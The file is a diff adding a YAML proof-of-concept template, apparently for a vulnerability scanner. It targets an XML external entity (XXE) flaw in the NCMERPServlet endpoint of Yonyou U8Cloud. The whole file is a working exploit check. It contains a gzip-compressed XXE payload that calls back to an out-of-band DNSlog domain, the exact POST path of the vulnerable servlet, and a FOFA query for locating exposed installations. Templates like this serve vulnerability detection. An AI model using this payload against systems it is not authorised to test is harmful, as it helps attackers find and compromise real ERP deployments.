@@ -1,0 +1,21 @@
+id: poc-yaml-yongyou-u8cloud-ncmerpservlet-xxe
+info:
+  name: 用友U8Cloud NCMERPServlet XML实体注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  payload: concat(`<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://`,domain,`/mt">]><r><a>&xxe;</a
+    ></r>`)
+  gpayload: gzip(payload)
+requests:
+- method: POST
+  path: /servlet/~uap/nc.merp.bs.NCMERPServlet
+  data: '{{.gpayload}}'
+  expression: reverse.Verify()
+transport: http
